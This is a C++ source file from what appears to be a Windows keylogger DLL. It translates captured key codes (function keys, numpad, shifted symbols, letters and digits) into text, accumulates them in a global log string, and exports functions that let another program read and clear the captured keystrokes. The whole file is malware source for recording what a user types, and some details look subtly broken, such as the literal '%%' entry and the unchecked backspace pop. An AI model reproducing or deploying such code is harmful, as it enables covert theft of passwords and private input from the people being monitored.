// This is an open source non-commercial project. Dear PVS-Studio, please check it.
// PVS-Studio Static Code Analyzer for C, C++, C#, and Java: http://www.viva64.com
#include "pch.h"
#include "keylogger.hpp"

void PrintSpecialKeys(const DWORD& key, const bool& shiftState)
{
	switch (key)
	{
	case VK_SPACE:
		LogKeys(" ");
		break;
	case VK_RETURN:
		LogKeys("\n");
		break;
	case VK_OEM_PERIOD:
		if (shiftState) LogKeys(">");
		else LogKeys(".");
		break;
	case VK_OEM_COMMA:
		if (shiftState) LogKeys("<");
		else LogKeys(",");
		break;
	case VK_SHIFT:
		LogKeys("[SHIFT]");
		break;
	case VK_LSHIFT:
		LogKeys("[SHIFT]");
		break;
	case VK_RSHIFT:
		LogKeys("[SHIFT]");
		break;
	case VK_CONTROL:
		LogKeys("[CTRL]");
		break;
	case VK_LCONTROL:
		LogKeys("[CTRL]");
		break;
	case VK_RCONTROL:
		LogKeys("[CTRL]");
		break;
	case VK_BACK:
		logStr.pop_back();
		break;
	case VK_CAPITAL:
		LogKeys("[CAPS]");
		break;
	case VK_F1:
		LogKeys("[F1]");
		break;
	case VK_F2:
		LogKeys("[F2]");
		break;
	case VK_F3:
		LogKeys("[F3]");
		break;
	case VK_F4:
		LogKeys("[F4]");
		break;
	case VK_F5:
		LogKeys("[F5]");
		break;
	case VK_F6:
		LogKeys("[F6]");
		break;
	case VK_F7:
		LogKeys("[F7]");
		break;
	case VK_F8:
		LogKeys("[F8]");
		break;
	case VK_F9:
		LogKeys("[F9]");
		break;
	case VK_F10:
		LogKeys("[F10]");
		break;
	case VK_F11:
		LogKeys("[F11]");
		break;
	case VK_F12:
		LogKeys("[F12]");
		break;
	case VK_NUMPAD0:
		LogKeys("0");
		break;
	case VK_NUMPAD1:
		LogKeys("1");
		break;
	case VK_NUMPAD2:
		LogKeys("2");
		break;
	case VK_NUMPAD3:
		LogKeys("3");
		break;
	case VK_NUMPAD4:
		LogKeys("4");
		break;
	case VK_NUMPAD5:
		LogKeys("5");
		break;
	case VK_NUMPAD6:
		LogKeys("6");
		break;
	case VK_NUMPAD7:
		LogKeys("7");
		break;
	case VK_NUMPAD8:
		LogKeys("8");
		break;
	case VK_NUMPAD9:
		LogKeys("9");
		break;
	case VK_TAB:
		LogKeys("[TAB]");
		break;
	case VK_MENU:
		LogKeys("[ALT]");
		break;
	case VK_LMENU:
		LogKeys("[ALT]");
		break;
	case VK_RMENU:
		LogKeys("[ALT]");
		break;
	case VK_OEM_MINUS:
		if (shiftState) LogKeys("_");
		else LogKeys("-");
		break;
	case VK_OEM_PLUS:
		if (shiftState) LogKeys("+");
		else LogKeys("=");
		break;
	case VK_OEM_1:
		if (shiftState) LogKeys(":");
		else LogKeys(";");
		break;
	case VK_OEM_2:
		if (shiftState) LogKeys("?");
		else LogKeys("/");
		return;
	case VK_OEM_3:
		if (shiftState) LogKeys("~");
		else LogKeys("`");
		break;
	case VK_OEM_4:
		if (shiftState) LogKeys("{");
		else LogKeys("[");
		break;
	case VK_OEM_5:
		if (shiftState) LogKeys("|");
		else LogKeys("\\");
		break;
	case VK_OEM_6:
		if (shiftState) LogKeys("}");
		else LogKeys("]");
		break;
	case VK_OEM_7:
		if (shiftState) LogKeys('"');
		else LogKeys("'");
		break;
	case VK_SNAPSHOT:
		LogKeys("[PRNTSCR]");
		return;
	case VK_INSERT:
		LogKeys("[INSERT]");
		return;
	case VK_HOME:
		LogKeys("[HOME]");
		return;
	case VK_PRIOR:
		LogKeys("[PGUP]");
		return;
	case VK_NEXT:
		LogKeys("[PGDOWN]");
		return;
	case VK_DELETE:
		LogKeys("[DEL]");
		return;
	case VK_END:
		LogKeys("[END]");
		return;
	case VK_DIVIDE:
		LogKeys("/");
		return;
	case VK_MULTIPLY:
		LogKeys("*");
		return;
	case VK_ADD:
		LogKeys("+");
		return;
	case VK_SUBTRACT:
		LogKeys("-");
		return;
	case VK_LWIN:
		LogKeys("[LWIN]");
		return;
	case VK_RWIN:
		LogKeys("[RWIN]");
		return;
	case VK_SCROLL:
		LogKeys("[SCRLK]");
		return;
	case VK_ESCAPE:
		LogKeys("[ESC]");
		return;
	case VK_DECIMAL:
		LogKeys(".");
		return;
	default:
		return;
	}
}

void PrintDigits(const DWORD& key, const bool& shiftState)
{
	if (shiftState)
	{
		switch (key)
		{
		case 48:
			LogKeys("!");
			return;
		case 49:
			LogKeys("@");
			return;
		case 50:
			LogKeys("#");
			return;
		case 51:
			LogKeys("$");
			return;
		case 52:
			LogKeys("%%");
			return;
		case 53:
			LogKeys("^");
			return;
	case 54:
			LogKeys("&");
			return;
		case 55:
			LogKeys("*");
			return;
		case 56:
			LogKeys("(");
			return;
		case 57:
			LogKeys(")");
			return;
		default:
			return;
		}
	}
	LogDigit(key - 48);
}

void PrintAlpha(const DWORD& key, const bool&& upper)
{
	const int offset = 32 * !upper;
	LogKeys(key + offset);
}

void LogKeys(const std::string_view&& str)
{
	logStr += str;
	sizeOfLogStr++;
	//printf("%s", str.data());
}

void LogKeys(const DWORD&& key)
{
	logStr += static_cast<char>(key);
	sizeOfLogStr++;
	//printf("%c", key);
}

void LogDigit(const DWORD&& digit)
{
	logStr  += std::to_string(digit);
	sizeOfLogStr++;
	//printf("%i", digit);
}

extern "C++" __declspec(dllexport) inline std::string GetLog() {
	return logStr;
}

extern "C++" __declspec(dllexport) inline void ClearLogStr() {
	logStr.clear();
}

extern "C++" __declspec(dllexport) inline int GetSizeOfLogStr() {
	return sizeOfLogStr;
}